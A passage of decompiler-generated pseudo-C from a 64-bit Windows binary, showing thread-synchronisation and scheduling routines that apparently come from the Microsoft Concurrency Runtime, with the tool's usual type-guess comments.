  __int64 (__fastcall *v8)(); // [rsp+30h] [rbp-18h]

  v1 = *(_DWORD *)(a1 + 636);
  if ( v1 >= 0 )
  {
    v7 = 0;
    v8 = sub_13F142C2C;
    do
    {
      sub_13F141BF4((__int64)v6);
      v1 = *(_DWORD *)(a1 + 636);
    }
    while ( v1 >= 0 );
  }
  v4 = v1;
  result = (unsigned int)_InterlockedCompareExchange((volatile signed __int32 *)(a1 + 636), v1 & 0x7FFFFFFF, v1);
  if ( v4 != (_DWORD)result )
  {
    do
    {
      v5 = result;
      result = (unsigned int)_InterlockedCompareExchange(
                               (volatile signed __int32 *)(a1 + 636),
                               result & 0x7FFFFFFF,
                               result);
    }
    while ( (_DWORD)result != v5 );
  }
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 624));
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F14BA70: using guessed type char var_28[8];

//----- (000000013F14BAE0) ----------------------------------------------------
__int64 __fastcall sub_13F14BAE0(__int64 a1)
{
  if ( *(_BYTE *)(a1 + 1552) )
    _InterlockedDecrement(&dword_13F1C5DBC);
  if ( (unsigned __int16)MEMORY[0x771A31E0](qword_13F1C5DE0) < 0x10u )
    JUMPOUT(0x771C4CC0i64);
  sub_13F140ECC(a1 + 16, 16i64, 96i64);
  return sub_13F14088C(a1, 1568i64);
}
// 13F14BB28: control flows out of bounds to 771C4CC0
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1C5DBC: using guessed type int dword_13F1C5DBC;
// 13F1C5DE0: using guessed type __int64 qword_13F1C5DE0[2];

//----- (000000013F14BB58) ----------------------------------------------------
__int64 sub_13F14BB58()
{
  return 0i64;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);

//----- (000000013F14BB74) ----------------------------------------------------
char __fastcall sub_13F14BB74(__int64 a1)
{
  char v1; // r8
  signed __int32 v2; // eax

  v1 = 0;
  while ( 1 )
  {
    v2 = *(_DWORD *)(a1 + 616);
    if ( !v2 )
      break;
    if ( v2 == _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 616), v2 + 1, v2) )
      return 1;
  }
  return v1;
}

//----- (000000013F14BB98) ----------------------------------------------------
__int64 __fastcall sub_13F14BB98(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v6; // rax
  __int64 v7; // rbx
  __int64 (__fastcall ***v8)(_QWORD, __int64, __int64); // rcx

  v6 = sub_13F142818(0i64);
  v7 = v6;
  if ( v6 && sub_13F102FE0(v6) == a1 )
    v8 = (__int64 (__fastcall ***)(_QWORD, __int64, __int64))sub_13F14E9A4(v7);
  else
    v8 = *(__int64 (__fastcall ****)(_QWORD, __int64, __int64))(a1 + 304);
  return (**v8)(v8, a2, a3);
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14BC10) ----------------------------------------------------
__int64 __fastcall sub_13F14BC10(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v10; // rax

  v8 = sub_13F142818(0i64);
  v9 = v8;
  if ( v8 && sub_13F102FE0(v8) == a1 )
    v10 = sub_13F14E9A4(v9);
  else
    v10 = *(_QWORD *)(a1 + 304);
  return sub_13F1596D8(v10, a2, a3, a4);
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14BC94) ----------------------------------------------------
__int64 __fastcall sub_13F14BC94(__int64 a1, __int64 a2)
{
  int v2; // edx
  __int64 result; // rax

  if ( *(_DWORD *)(a1 + 20) == 1 )
  {
    v2 = *(_DWORD *)(a2 + 296);
    do
    {
      v2 = (v2 + 1) % *(_DWORD *)(a1 + 68);
      result = *(unsigned int *)(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8i64 * v2) + 300i64);
    }
    while ( !(_DWORD)result );
    *(_DWORD *)(a1 + 604) = v2;
  }
  return result;
}

//----- (000000013F14BCC8) ----------------------------------------------------
char __fastcall sub_13F14BCC8(__int64 a1, __int64 a2, __int64 a3)
{
  int v4[2]; // [rsp+20h] [rbp-28h] BYREF
  __int64 v5; // [rsp+28h] [rbp-20h]
  __int64 v6; // [rsp+30h] [rbp-18h]

  v4[0] = *(_DWORD *)a3;
  v5 = *(_QWORD *)(a3 + 8);
  v4[1] = *(_DWORD *)(a3 + 4);
  v6 = *(_QWORD *)(a3 + 16);
  return sub_13F14BD04(a1, a2, (__int64)v4, 3);
}

//----- (000000013F14BD04) ----------------------------------------------------
char __fastcall sub_13F14BD04(__int64 a1, __int64 a2, __int64 a3, int a4)
{
  char v8; // bp
  unsigned int v10; // [rsp+20h] [rbp-48h] BYREF
  __int64 v11; // [rsp+28h] [rbp-40h]
  int v12[2]; // [rsp+30h] [rbp-38h] BYREF
  __int64 v13; // [rsp+38h] [rbp-30h]
  __int64 v14; // [rsp+40h] [rbp-28h]

  v8 = 0;
  sub_13F14EF64();
  v12[0] = *(_DWORD *)a3;
  v13 = *(_QWORD *)(a3 + 8);
  v12[1] = *(_DWORD *)(a3 + 4);
  v14 = *(_QWORD *)(a3 + 16);
  v10 = 0;
  if ( sub_13F149778(a1, (__int64)&v10, (__int64)v12, a4) )
  {
    sub_13F154694(v11, v10, a2, 0i64);
    v10 = 0;
    v8 = 1;
  }
  sub_13F14EF64();
  return v8;
}
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);

//----- (000000013F14BD9C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F14BD9C()
{
  __int64 result; // rax
  char v1[8]; // [rsp+28h] [rbp-20h] BYREF
  int v2; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v3)(); // [rsp+38h] [rbp-10h]

  result = (unsigned int)_InterlockedExchange(&dword_13F1C5DF8, 1);
  if ( (_DWORD)result )
  {
    v2 = 0;
    v3 = sub_13F142C2C;
    do
    {
      sub_13F141BF4((__int64)v1);
      result = (unsigned int)_InterlockedExchange(&dword_13F1C5DF8, 1);
    }
    while ( (_DWORD)result );
  }
  dword_13F1C5DB8 = -1;
  dword_13F1C5DF8 = 0;
  return result;
}
// 13F14BDEF: write access to const memory at 13F1C5DB8 has been detected
// 13F14BE3F: write access to const memory at 13F1C5DF8 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F1C5DB8: using guessed type int dword_13F1C5DB8;
// 13F1C5DF8: using guessed type int dword_13F1C5DF8;
// 13F14BD9C: using guessed type char var_20[8];

//----- (000000013F14BE50) ----------------------------------------------------
__int64 __fastcall sub_13F14BE50(__int64 a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // ebx
  __int64 v9; // r11
  __int64 v10; // r8
  int i; // er9
  int v12; // edx
  __int64 v13; // rcx
  __int64 v14; // r10
  int v15; // edx
  _QWORD *v16; // r10
  __int64 v17; // rcx
  _DWORD *v18; // r10
  int v19; // edx
  int v20; // ecx
  int v21; // ebp
  int v22; // edx
  int v23; // ecx
  __int64 result; // rax
  int v25; // edx
  __int64 v26; // r8
  int v27; // edx
  _QWORD *v28; // r8
  __int64 v29; // rcx
  int *v30; // rbx
  int v31; // edx
  int v32; // ecx

  v4 = 0;
  if ( *(int *)(a1 + 68) > 0 )
  {
    v9 = 0i64;
    do
    {
      v10 = *(_QWORD *)(v9 + *(_QWORD *)(a1 + 48));
      if ( v10 )
      {
        for ( i = 0; i < *(_DWORD *)(v10 + 192); ++i )
        {
          v12 = i >> *(_DWORD *)(v10 + 164);
          if ( v12 < *(_DWORD *)(v10 + 188) )
          {
            v13 = *(int *)(v10 + 184);
            v14 = *(_QWORD *)(v10 + 176);
            if ( v12 < (int)v13 )
            {
              v16 = *(_QWORD **)(v14 + 8i64 * v12);
            }
            else
            {
              v15 = v12 - v13;
              v16 = *(_QWORD **)(v14 + 8 * v13 - 8);
              if ( v15 >= 0 )
              {
                v17 = (unsigned int)(v15 + 1);
                do
                {
                  v16 = (_QWORD *)v16[1];
                  --v17;
                }
                while ( v17 );
              }
            }
            v18 = *(_DWORD **)(*v16 + 8 * (i & (unsigned __int64)(*(int *)(v10 + 160) - 1i64)));
            if ( v18 )
            {
              v19 = v18[40] - v18[42];
              v18[42] = v18[40];
              v20 = v18[41] - v18[43];
              v18[43] = v18[41];
              *a3 += v19;
              *a2 += v20;
              *a4 += v19 - v20;
            }
          }
        }
      }
      ++v4;
      v9 += 8i64;
    }
    while ( v4 < *(_DWORD *)(a1 + 68) );
  }
  v21 = 0;
  v22 = *(_DWORD *)(a1 + 684) - *(_DWORD *)(a1 + 692);
  *(_DWORD *)(a1 + 692) = *(_DWORD *)(a1 + 684);
  v23 = *(_DWORD *)(a1 + 688) - *(_DWORD *)(a1 + 696);
  *(_DWORD *)(a1 + 696) = *(_DWORD *)(a1 + 688);
  *a3 += v22;
  *a2 += v23;
  *a4 += v22 - v23;
  result = *(unsigned int *)(a1 + 448);
  if ( (int)result > 0 )
  {
    do
    {
      v25 = v21 >> *(_DWORD *)(a1 + 420);
      if ( v25 < *(_DWORD *)(a1 + 444) )
      {
        v26 = *(_QWORD *)(a1 + 432);
        if ( v25 < *(_DWORD *)(a1 + 440) )
        {
          v28 = *(_QWORD **)(v26 + 8i64 * v25);
        }
        else
        {
          v27 = v25 - *(_DWORD *)(a1 + 440);
          v28 = *(_QWORD **)(v26 + 8i64 * *(int *)(a1 + 440) - 8);
          if ( v27 >= 0 )
          {
            v29 = (unsigned int)(v27 + 1);
            do
            {
              v28 = (_QWORD *)v28[1];
              --v29;
            }
            while ( v29 );
          }
        }
        v30 = *(int **)(*v28 + 8 * (v21 & (unsigned __int64)(*(int *)(a1 + 416) - 1i64)));
        if ( v30 )
        {
          v31 = v30[8] - v30[10];
          v30[10] = v30[8];
          v32 = v30[9] - v30[11];
          v30[11] = v30[9];
          *a3 += v31;
          *a2 += v32;
          *a4 += v31 - v32;
          if ( !v30[12] && v30[8] == v30[10] && v30[9] == v30[11] )
          {
            sub_13F14B550(a1 + 336, (signed __int64)v30, *v30, 0);
            sub_13F14088C(v30, 64i64);
          }
        }
      }
      result = *(unsigned int *)(a1 + 448);
      ++v21;
    }
    while ( v21 < (int)result );
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14C0A0) ----------------------------------------------------
__int64 __fastcall sub_13F14C0A0(volatile signed __int32 *a1)
{
  __int64 v2; // rax
  char v3; // bp
  int v4; // eax
  __int64 result; // rax
  signed __int32 v6; // eax
  signed __int32 v7; // er8

  v2 = sub_13F142818(0i64);
  v3 = 1;
  if ( v2 && !*(_BYTE *)(v2 + 136) )
  {
    v3 = 0;
    sub_13F1024C0();
  }
  v4 = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)a1 + 144i64))(a1);
  if ( v4 )
  {
    if ( v4 == 2 && !*((_DWORD *)a1 + 160) )
      _InterlockedExchange(a1 + 160, 1);
    v6 = *((_DWORD *)a1 + 159);
    do
    {
      v7 = v6;
      v6 = _InterlockedCompareExchange(a1 + 159, v6 & 0xBFFFFFFF, v6);
    }
    while ( v6 != v7 );
    result = v6 & 0x1FFFFFFF;
    if ( (_DWORD)result )
      result = MEMORY[0x76F88C10](*((_QWORD *)a1 + 76), (unsigned int)result, 0i64);
  }
  else
  {
    result = sub_13F14B000(a1);
  }
  if ( !v3 )
    return sub_13F1024C0();
  return result;
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F14C174) ----------------------------------------------------
char __fastcall sub_13F14C174(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rdi
  char v3; // bl
  char v4; // si
  __int64 v5; // rax
  int v6; // ecx
  __int64 v7; // rdx
  unsigned int v8; // ebx
  __int64 v9; // rcx
  int v10; // eax
  unsigned int v11; // edx
  int v13[2]; // [rsp+20h] [rbp-38h] BYREF
  __int64 v14; // [rsp+28h] [rbp-30h]
  __int64 v15; // [rsp+30h] [rbp-28h]

  v1 = *(_DWORD *)(a1 + 736);
  v2 = a1;
  if ( v1 <= 0 )
    return v1;
  v3 = 0;
  v4 = 0;
  while ( 1 )
  {
    v5 = sub_13F149D3C(a1, 0);
    if ( !v5 )
      break;
    v3 |= sub_13F14ABA0(v2, v5);
    if ( *(int *)(v2 + 680) <= 0 || (unsigned int)sub_13F14C304(v2, 1) )
      goto LABEL_8;
    a1 = v2;
  }
  v4 = 1;
LABEL_8:
  if ( *(_DWORD *)(v2 + 640) || !v4 && *(int *)(v2 + 680) <= 0 )
  {
    v6 = *(_DWORD *)(v2 + 736);
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)(v2 + 736), -v6) != v6 )
      goto LABEL_16;
    v1 = *(_DWORD *)(v2 + 640);
    if ( !v1 )
      return v1;
    if ( v3 )
      return v1;
    v13[0] = 0;
    v14 = 0i64;
    v13[1] = 0;
    v7 = *(_QWORD *)(sub_13F149FE4(v2) + 16);
    v15 = 0i64;
    LOBYTE(v1) = sub_13F14BD04(v2, v7, (__int64)v13, 11);
    if ( (_BYTE)v1 )
      return v1;
  }
  _InterlockedExchange((volatile __int32 *)(v2 + 736), 1);
LABEL_16:
  v8 = sub_13F14C304(v2, 1);
  v10 = sub_13F1426A8(v9);
  v11 = v10 - *(_DWORD *)(v2 + 704) < v8 ? v8 - (v10 - *(_DWORD *)(v2 + 704)) : 0;
  if ( v4 && v11 < 0x1F4 )
    v11 = 500;
  LOBYTE(v1) = (unsigned __int8)sub_13F148A94(v2, v11);
  return v1;
}
// 13F14C26E: variable 'v9' is possibly undefined
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);

//----- (000000013F14C2AC) ----------------------------------------------------
char __fastcall sub_13F14C2AC(__int64 a1, __int64 a2)
{
  return sub_13F14C174(a2);
}

//----- (000000013F14C2BC) ----------------------------------------------------
char __fastcall sub_13F14C2BC(__int64 a1)
{
  unsigned int v2; // ebx
  __int64 v3; // rcx
  unsigned int v4; // eax

  v2 = sub_13F14C304(a1, 1);
  v4 = sub_13F1426A8(v3) - *(_DWORD *)(a1 + 704);
  if ( v4 >= v2 )
    return sub_13F14C174(a1);
  else
    return (unsigned __int8)sub_13F148A94(a1, v2 - v4);
}
// 13F14C2D5: variable 'v3' is possibly undefined
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);

//----- (000000013F14C304) ----------------------------------------------------
__int64 __fastcall sub_13F14C304(__int64 a1, int a2)
{
  unsigned int v2; // er8
  unsigned int v3; // eax
  unsigned int v5; // er8
  int v6; // er8

  v2 = *(_DWORD *)(a1 + 632);
  v3 = *(_DWORD *)(a1 + 700);
  if ( v2 < v3 )
    return 0i64;
  v5 = v2 - v3;
  if ( v5 >= 0x64 )
  {
    if ( v5 >= 0x12C )
    {
      if ( v5 >= 0x258 )
      {
        if ( v5 >= 0x5DC )
        {
          if ( v5 >= 0x9C4 )
          {
            if ( v5 >= 0xFA0 )
              v6 = (v5 >> 1) + 8200;
            else
              v6 = v5 / 3 + 2500;
          }
          else
          {
            v6 = v5 / 3 + 555;
          }
        }
        else
        {
          v6 = (v5 >> 2) + 180;
        }
      }
      else
      {
        v6 = v5 / 5 + 60;
      }
    }
    else
    {
      v6 = (v5 >> 3) + 15;
    }
  }
  else
  {
    v6 = v5 / 0xA + 5;
  }
  return (unsigned int)(a2 * v6);
}

//----- (000000013F14C3D4) ----------------------------------------------------
void sub_13F14C3D4()
{
  ;
}

//----- (000000013F14C45C) ----------------------------------------------------
__int64 __fastcall sub_13F14C45C(__int64 a1, _DWORD *a2)
{
  _DWORD *v2; // rsi

  v2 = (_DWORD *)(a1 + 536);
  sub_13F142BD8((volatile __int32 *)(a1 + 536));
  if ( *a2 != *(_DWORD *)(a1 + 552) )
  {
    while ( ((_InterlockedExchangeAdd((volatile signed __int32 *)(a1 + 552), 1u) + 2) & 0xFFFFFFFE) == 0 )
      ;
  }
  return sub_13F142C20(v2);
}

//----- (000000013F14C4BC) ----------------------------------------------------
__int64 __fastcall sub_13F14C4BC(__int64 a1)
{
  unsigned int v2; // ebx

  v2 = 0;
  if ( sub_13F1498E4(a1) || sub_13F149918(a1) )
    return 1i64;
  if ( *(int *)(a1 + 736) > 0 )
    return 2;
  return v2;
}

//----- (000000013F14C504) ----------------------------------------------------
__int64 __fastcall sub_13F14C504(__int64 a1, int a2)
{
  if ( a2 == -1 )
  {
    *(_DWORD *)(a1 + 556) = 0;
    *(_DWORD *)(a1 + 560) = sub_13F148F0C(a1);
  }
  else
  {
    *(_DWORD *)(a1 + 556) = a2;
  }
  if ( *(_DWORD *)(a1 + 556) == *(_DWORD *)(a1 + 560) )
    return 0i64;
  else
    return *(unsigned int *)(a1 + 560);
}

//----- (000000013F14C550) ----------------------------------------------------
__int64 __fastcall sub_13F14C550(__int64 a1)
{
  unsigned int v2; // er8
  __int64 result; // rax

  v2 = sub_13F148F0C(a1);
  if ( v2 <= *(_DWORD *)(a1 + 560) )
    return 0i64;
  if ( *(_DWORD *)(a1 + 560) == *(_DWORD *)(a1 + 556) )
    result = v2;
  else
    result = 0i64;
  *(_DWORD *)(a1 + 560) = v2;
  return result;
}

//----- (000000013F14C594) ----------------------------------------------------
char __fastcall sub_13F14C594(volatile signed __int32 *a1, __int64 a2)
{
  char v2; // di
  signed __int32 v4; // eax
  signed __int32 v5; // ett
  char v7[8]; // [rsp+20h] [rbp-28h] BYREF
  int v8; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v9)(); // [rsp+30h] [rbp-18h]

  v2 = a2;
  if ( (_BYTE)a2 )
  {
    v4 = *((_DWORD *)a1 + 159);
    while ( 1 )
    {
      if ( (v4 & 0x40000000) != 0 )
      {
        v4 = *((_DWORD *)a1 + 159);
        if ( (v4 & 0x40000000) != 0 )
        {
          v8 = 0;
          v9 = sub_13F142C2C;
          do
          {
            sub_13F141BF4((__int64)v7);
            v4 = *((_DWORD *)a1 + 159);
          }
          while ( (v4 & 0x40000000) != 0 );
        }
      }
      if ( (v4 & 0x20000000) != 0 )
        break;
      v5 = v4;
      v4 = _InterlockedCompareExchange(a1 + 159, v4 + 1, v4);
      if ( v5 == v4 )
      {
        LOBYTE(a2) = v2;
        (*(void (__fastcall **)(volatile signed __int32 *, __int64, _QWORD))(*(_QWORD *)a1 + 136i64))(
          a1,
          a2,
          (unsigned int)_InterlockedIncrement(a1 + 168));
        return 1;
      }
    }
    return 0;
  }
  else
  {
    (*(void (__fastcall **)(volatile signed __int32 *, _QWORD, _QWORD))(*(_QWORD *)a1 + 136i64))(
      a1,
      0i64,
      (unsigned int)_InterlockedDecrement(a1 + 168));
    if ( (_InterlockedDecrement(a1 + 159) & 0x9FFFFFFF) == 0x80000000 )
      sub_13F148A2C(a1);
    return 1;
  }
}
// 13F14C620: variable 'a2' is possibly undefined
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F14C594: using guessed type char var_28[8];

//----- (000000013F14C680) ----------------------------------------------------
__int64 __fastcall sub_13F14C680(__int64 a1, char a2)
{
  sub_13F14EF64();
  if ( a2 )
  {
    if ( (_InterlockedDecrement((volatile signed __int32 *)(a1 + 636)) & 0x9FFFFFFF) == 0x80000000 )
      sub_13F148A2C((volatile signed __int32 *)a1);
  }
  else if ( (_InterlockedIncrement((volatile signed __int32 *)(a1 + 636)) & 0x40000000) != 0 )
  {
    MEMORY[0x76F91980](*(_QWORD *)(a1 + 608), 0xFFFFFFFFi64, 0i64);
  }
  return sub_13F14EF64();
}
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);

//----- (000000013F14C6F4) ----------------------------------------------------
__int64 __fastcall sub_13F14C6F4(int *a1)
{
  int v2; // esi
  __int64 v3; // r14
  _QWORD *v4; // rcx
  _QWORD *v5; // rbx
  __int64 v6; // r8
  __int64 result; // rax

  if ( a1[1] > 0 )
  {
    v2 = 0;
    if ( *a1 > 0 )
    {
      v3 = 0i64;
      do
      {
        v4 = *(_QWORD **)(v3 + *((_QWORD *)a1 + 1));
        if ( v4 )
        {
          do
          {
            v5 = (_QWORD *)*v4;
            sub_13F14088C(v4, 16i64);
            v4 = v5;
          }
          while ( v5 );
        }
        ++v2;
        v3 += 8i64;
      }
      while ( v2 < *a1 );
    }
    v6 = *a1;
    a1[1] = 0;
    return sub_13F15EF70(*((_QWORD *)a1 + 1), 0, 8 * v6);
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14C774) ----------------------------------------------------
__int64 __fastcall sub_13F14C774(__int64 a1, __int64 a2, char a3, unsigned __int8 a4)
{
  __int64 v6; // rdi
  _QWORD *v8; // rax
  __int64 result; // rax

  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)a1 = &Concurrency::details::WaitBlock::`vftable';
  *(_DWORD *)(a1 + 16) = 0;
  v6 = a4;
  v8 = sub_13F142ED0();
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_QWORD *)(a1 + 32) = 0i64;
  *(_QWORD *)(a1 + 8) = v8;
  *(_QWORD *)a1 = off_13F18A988;
  *(_QWORD *)(a1 + 48) = a2 + v6;
  result = a1;
  *(_DWORD *)(a1 + 40) = 0;
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_BYTE *)(a1 + 80) = a3;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_BYTE *)(a1 + 81) = 0;
  return result;
}
// 13F18A928: using guessed type void *Concurrency::details::WaitBlock::`vftable';
// 13F18A988: using guessed type void (__fastcall __noreturn *off_13F18A988[7])();

//----- (000000013F14C80C) ----------------------------------------------------
_QWORD *__fastcall sub_13F14C80C(_QWORD *a1, __int64 a2, __int64 a3, char a4, unsigned __int8 a5)
{
  char v8; // di
  __int64 v9; // rcx
  __int64 v10; // rax
  _QWORD *v11; // r14
  __int64 v12; // rcx
  __int64 v13; // rdx
  _QWORD *result; // rax

  a1[5] = 0i64;
  *a1 = 96i64;
  a1[1] = 16i64;
  v8 = a2;
  v9 = 16 * (a3 + 6);
  a1[2] = v9;
  v10 = sub_13F1790C4(v9, a2);
  a1[3] = v10;
  a1[4] = v10;
  v11 = (_QWORD *)v10;
  sub_13F14C774(v10, a3, a4, a5);
  if ( v8 )
  {
    *v11 = off_13F18A9C0;
    v11[7] = a3;
  }
  else
  {
    *v11 = off_13F18A9F8;
    v11[7] = 1i64;
  }
  v12 = *a1 + a1[3];
  if ( a3 )
  {
    v13 = a3;
    do
    {
      *(_QWORD *)(v12 + 8) = a1[4];
      v12 += a1[1];
      --v13;
    }
    while ( v13 );
  }
  result = a1;
  a1[6] = a3 + a5 + 1i64;
  return result;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F18A9C0: using guessed type __int64 (__fastcall *off_13F18A9C0[7])();
// 13F18A9F8: using guessed type __int64 (__fastcall *off_13F18A9F8[7])();

//----- (000000013F14C8EC) ----------------------------------------------------
_QWORD *__fastcall sub_13F14C8EC(_QWORD *a1)
{
  *a1 = 0i64;
  sub_13F14171C((__int64)(a1 + 1));
  return a1;
}

//----- (000000013F14C910) ----------------------------------------------------
_QWORD *__fastcall sub_13F14C910(_QWORD *a1)
{
  a1[1] = 0i64;
  *a1 = 0i64;
  sub_13F14171C((__int64)(a1 + 2));
  return a1;
}

//----- (000000013F14C938) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F14C938(_QWORD *a1))()
{
  __int64 (__fastcall **result)(); // rax
  __int64 v2; // rcx
  _DWORD *v3; // rcx

  result = &off_13F18AA60;
  *a1 = &off_13F18AA60;
  v2 = a1[1];
  if ( v2 )
  {
    v3 = (_DWORD *)(v2 - 16);
    if ( *v3 == 56797 )
      return (__int64 (__fastcall **)())sub_13F16A188(v3);
  }
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F18AA60: using guessed type __int64 (__fastcall *off_13F18AA60)();

//----- (000000013F14C968) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F14C968(_QWORD *a1)
{
  unsigned __int64 i; // rax
  __int64 v3; // rcx
  unsigned __int64 result; // rax

  for ( i = a1[5]; i < a1[6]; i = a1[5] )
  {
    v3 = a1[4];
    ++a1[5];
    sub_13F14CD04(v3);
  }
  result = i + 1;
  a1[5] = result;
  return result;
}

//----- (000000013F14C9A0) ----------------------------------------------------
char __fastcall sub_13F14C9A0(_QWORD *a1)
{
  sub_13F141B90((__int64)(a1 + 1));
  return sub_13F14D21C(a1);
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();

//----- (000000013F14C9E0) ----------------------------------------------------
char __fastcall sub_13F14C9E0(__int64 **a1)
{
  char result; // al
  __int64 *v3; // rbx
  __int64 *v4; // rbp
  __int64 *v5; // rcx
  __int64 *v6; // rbx

  result = sub_13F141B90((__int64)(a1 + 2));
  v3 = *a1;
  if ( (unsigned __int64)*a1 > 1 )
  {
    do
    {
      v4 = (__int64 *)*v3;
      result = (**(__int64 (__fastcall ***)(__int64, _QWORD, __int64 *))v3[1])(v3[1], 0i64, v3);
      if ( result )
        result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3[1] + 16i64))(v3[1]);
      v3 = v4;
    }
    while ( v4 );
  }
  v5 = a1[1];
  if ( v5 )
  {
    do
    {
      v6 = (__int64 *)*v5;
      result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v5[1] + 16i64))(v5[1]);
      v5 = v6;
    }
    while ( v6 );
  }
  return result;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CA8C) ----------------------------------------------------
_QWORD *__fastcall sub_13F14CA8C(_QWORD *a1, char a2)
{
  __int64 v4; // rcx
  _DWORD *v5; // rcx

  *a1 = &off_13F18AA60;
  v4 = a1[1];
  if ( v4 )
  {
    v5 = (_DWORD *)(v4 - 16);
    if ( *v5 == 56797 )
      sub_13F16A188(v5);
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F18AA60: using guessed type __int64 (__fastcall *off_13F18AA60)();

//----- (000000013F14CAE4) ----------------------------------------------------
__int64 __fastcall sub_13F14CAE4(__int64 a1)
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 52));
  if ( (_DWORD)result == 2 )
    return sub_13F14088C(a1, 64i64);
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F14CB10) ----------------------------------------------------
__int64 __fastcall sub_13F14CB10(__int64 a1, __int64 a2)
{
  char v3; // di
  __int64 v4; // rcx
  __int64 result; // rax

  v3 = 0;
  if ( _InterlockedIncrement((volatile signed __int32 *)(a2 + 40)) == 1 )
  {
    v4 = *(_QWORD *)(a2 + 8);
    v3 = 1;
    *(_BYTE *)(a2 + 81) = 1;
    if ( v4 )
    {
      *(_QWORD *)(a2 + 24) = 0i64;
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
    }
  }
  result = sub_13F14CD04(a2);
  if ( v3 )
    return sub_13F142B40();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CB90) ----------------------------------------------------
__int64 __fastcall sub_13F14CB90(__int64 a1, __int64 (__fastcall ***a2)(_QWORD, _QWORD, _QWORD))
{
  __int64 result; // rax

  result = (**a2)(a2, 0i64, 0i64);
  if ( (_BYTE)result )
    return sub_13F142B40();
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CBD4) ----------------------------------------------------
__int64 __fastcall sub_13F14CBD4(__int64 a1)
{
  __int64 v2; // rdi
  __int64 v3; // rax

  if ( _InterlockedIncrement((volatile signed __int32 *)(a1 + 40)) == 1 )
  {
    v2 = *(_QWORD *)(a1 + 8);
    v3 = sub_13F14CC50();
    sub_13F142350(v3, *(_QWORD *)(a1 + 32), 0i64);
    *(_BYTE *)(a1 + 81) = 1;
    if ( v2 )
    {
      *(_QWORD *)(a1 + 24) = 0i64;
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 24i64))(v2);
    }
  }
  return sub_13F14CD04(a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CC3C) ----------------------------------------------------
__int64 __fastcall sub_13F14CC3C(__int64 (__fastcall ***a1)(_QWORD, _QWORD, _QWORD))
{
  return (**a1)(a1, 0i64, 0i64);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14CC50) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F14CC50()
{
  int v1; // [rsp+28h] [rbp-30h]
